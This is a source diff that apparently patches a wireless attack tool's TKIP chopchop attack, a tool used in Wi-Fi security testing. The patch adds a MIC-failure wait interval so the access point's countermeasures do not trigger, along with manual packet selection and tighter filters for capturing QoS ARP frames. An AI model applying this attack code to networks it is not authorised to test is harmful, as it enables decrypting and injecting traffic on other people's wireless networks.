@@ -133,6 +133,8 @@
 #define RATE_48M 48000000
 #define RATE_54M 54000000
 
+#define DEFAULT_MIC_FAILURE_INTERVAL 60
+
 static uchar ZERO[32] =
         "\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -162,11 +164,12 @@ char usage[] =
 "\n"
 "      -d dmac   : MAC address, Destination\n"
 "      -s smac   : MAC address, Source\n"
-"      -m len    : minimum packet length\n"
-"      -n len    : maximum packet length\n"
+"      -m len    : minimum packet length (default: 80) \n"
+"      -n len    : maximum packet length (default: 80)\n"
 "      -t tods   : frame control, To      DS bit\n"
 "      -f fromds : frame control, From    DS bit\n"
 "      -D        : disable AP detection\n"
+"      -Z        : select packets manually\n"
 "\n"
 "  Replay options:\n"
 "\n"
@@ -174,8 +177,8 @@ char usage[] =
 "      -a bssid  : set Access Point MAC address\n"
 "      -c dmac   : set Destination  MAC address\n"
 "      -h smac   : set Source       MAC address\n"
-"      -F        : choose first matching packet\n"
 "      -e essid  : set target AP SSID\n"
+"      -M sec    : MIC error timout in seconds [60]\n"
 "\n"
 "  Debug options:\n"
 "\n"
@@ -212,6 +215,8 @@ struct options
     unsigned char f_smac[6];
     int f_minlen;
     int f_maxlen;
+    int f_minlen_set;
+    int f_maxlen_set;
     int f_type;
     int f_subtype;
     int f_tods;
@@ -2146,6 +2151,7 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
     int tried_header_rec=0;
     int tries=0;
     int keystream_len=0;
+    int settle=0;
 
     unsigned char b1 = 0xAA;
     unsigned char b2 = 0xAA;
@@ -2452,6 +2458,16 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
 
         /* wait for the next timer interrupt, or sleep */
 
+        if( (nb_pkt_sent > 0) && (nb_pkt_sent % 256 == 0) && settle == 0)
+        {
+            printf( "\rLooks like mic failure report was not detected."
+                    "Waiting %i seconds before trying again to avoid "
+                    "the AP shutting down.\n", opt.mic_failure_interval);
+            fflush( stdout );
+            settle = 1;
+            sleep(opt.mic_failure_interval);
+        }
+
         if( dev.fd_rtc >= 0 )
         {
             if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
@@ -2618,6 +2634,8 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
                     guess = 0;
                 else
                     tries++;
+
+                settle=0;
             }
 
             if(tries > 768 && data_end < srclen)
@@ -2696,21 +2714,21 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
         {
             /* check if it's a WEP data packet */
 
-            if( ( h80211[0] & 0x0C ) != 8 ) continue;
+            if( ( h80211[0] & 0x0C ) != 8 ) continue; //must be a data packet
             if( ( h80211[0] & 0x70 ) != 0 ) continue;
 //             if( ( h80211[1] & 0x03 ) != 2 ) continue;
             if( ( h80211[1] & 0x40 ) == 0 ) continue;
 
-            /* check the extended IV (TKIP) flag */
-
+            /* get header length right */
             z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
             if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                 z+=2;
 
+            /* check the extended IV (TKIP) flag */
             if( ( h80211[z + 3] & 0x20 ) == 0 ) continue;
 
             /* check length (153)!? */
-            if( n != 153 ) continue;
+            if( z+127 != n ) continue; //(153[26+127] bytes for eapol mic failure in tkip qos frames from client to AP)
 
 //             printf("yeah!\n");
 
@@ -2760,6 +2778,7 @@ int do_attack_tkipchop( uchar* src_packet, int src_packet_len )
 
 //         guess = h80211[9];
         tries = 0;
+        settle = 0;
         guess = (guess - 1) % 256;
 
         chopped[data_end - 1] ^= guess;
@@ -3696,16 +3715,18 @@ int main( int argc, char *argv[] )
     memset( &dev, 0, sizeof( dev ) );
 
     opt.f_type    = -1; opt.f_subtype   = -1;
-    opt.f_minlen  = 80; opt.f_maxlen    = 96;
+    opt.f_minlen  = 80; opt.f_maxlen    = 80;
+    opt.f_minlen_set = 0;
+    opt.f_maxlen_set = 0;
     opt.f_tods    = -1; opt.f_fromds    = -1;
     opt.f_iswep   = -1; opt.ringbuffer  =  8;
 
     opt.a_mode    = -1; opt.r_fctrl     = -1;
     opt.ghost     =  0; opt.npackets    = -1;
     opt.delay     = 15; opt.bittest     =  0;
-    opt.fast      =  0; opt.r_smac_set  =  0;
+    opt.fast      = -1; opt.r_smac_set  =  0;
     opt.npackets  =  1; opt.nodetect    =  0;
-    opt.mic_failure_interval = 60;
+    opt.mic_failure_interval = DEFAULT_MIC_FAILURE_INTERVAL;
 
 /* XXX */
 #if 0
@@ -3736,7 +3757,7 @@ int main( int argc, char *argv[] )
         };
 
         int option = getopt_long( argc, argv,
-                        "d:s:m:n:t:f:x:a:c:h:e:jy:i:r:HFDK:P:p:",
+                        "d:s:m:n:t:f:x:a:c:h:e:jy:i:r:HZDK:P:p:M:",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -3786,6 +3807,7 @@ int main( int argc, char *argv[] )
                     printf("\"%s --help\" for help.\n", argv[0]);
                     return( 1 );
                 }
+                opt.f_minlen_set=1;
                 break;
 
             case 'n' :
@@ -3797,6 +3819,7 @@ int main( int argc, char *argv[] )
                     printf("\"%s --help\" for help.\n", argv[0]);
                     return( 1 );
                 }
+                opt.f_maxlen_set=1;
                 break;
 
             case 't' :
@@ -3928,9 +3951,9 @@ int main( int argc, char *argv[] )
                 opt.s_file = optarg;
                 break;
 
-            case 'F' :
+            case 'Z' :
 
-                opt.fast = 1;
+                opt.fast = 0;
                 break;
 
             case 'H' :
@@ -3991,6 +4014,17 @@ int main( int argc, char *argv[] )
                 }
                 strncpy( opt.psk, optarg, sizeof( opt.psk )  - 1 );
                 opt.got_psk = 1;
+                break;
+
+            case 'M' :
+
+                ret = sscanf( optarg, "%d", &opt.mic_failure_interval );
+                if( opt.mic_failure_interval < 0 )
+                {
+                    printf( "Invalid MIC error timeout. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return( 1 );
+                }
                 break;
 
             default : goto usage;
@@ -4280,16 +4314,27 @@ usage:
 
     PCT; printf("Waiting for an ARP packet coming from the Client...\n");
 
-/*    opt.f_minlen = 80;
-    opt.f_maxlen = 80;*/
     opt.f_tods = 1;
     opt.f_fromds = 0;
     memcpy(opt.f_smac, opt.r_smac, 6);
-//     memcpy(opt.f_dmac, opt.f_bssid, 6);
-    opt.fast = 1;
+//    memcpy(opt.f_dmac, opt.f_bssid, 6);
+    if(opt.fast == -1)
+        opt.fast = 1;
 
-    if( capture_ask_packet( &caplen, 0 ) != 0 )
-        return( 1 );
+    if(opt.f_minlen_set == 0) {
+        opt.f_minlen = 80;
+    }
+    if(opt.f_maxlen_set == 0) {
+        opt.f_maxlen = 80;
+    }
+
+    while(1)
+    {
+        if( capture_ask_packet( &caplen, 0 ) != 0 )
+            return( 1 );
+        if( is_qos_arp_tkip(h80211, caplen) == 1 )
+            break;
+    }
 
     memcpy(packet2, h80211, caplen);
     packet2_len = caplen;
@@ -4298,16 +4343,25 @@ usage:
 
     PCT; printf("Waiting for an ARP response packet coming from the AP...\n");
 
-/*    opt.f_minlen = 80;
-    opt.f_maxlen = 80;*/
     opt.f_tods = 0;
     opt.f_fromds = 1;
     memcpy(opt.f_dmac, opt.r_smac, 6);
     memcpy(opt.f_smac, NULL_MAC, 6);
-    opt.fast = 1;
 
-    if( capture_ask_packet( &caplen, 0 ) != 0 )
-        return( 1 );
+    if(opt.f_minlen_set == 0) {
+        opt.f_minlen = 80;
+    }
+    if(opt.f_maxlen_set == 0) {
+        opt.f_maxlen = 98;
+    }
+
+    while(1)
+    {
+        if( capture_ask_packet( &caplen, 0 ) != 0 )
+            return( 1 );
+        if( is_qos_arp_tkip(h80211, caplen) == 1 )
+            break;
+    }
 
     memcpy(packet1, h80211, caplen);
     packet1_len = caplen;
@@ -4315,8 +4369,8 @@ usage:
 
     PCT; printf("Got the answer!\n");
 
-    PCT; printf("Waiting 5 seconds to let encrypted EAPOL frames pass without interfering.\n");
-    read_sleep(5*1000000);
+    PCT; printf("Waiting 10 seconds to let encrypted EAPOL frames pass without interfering.\n");
+    read_sleep(10*1000000);
 
     memcpy(h80211, packet1, packet1_len);
 
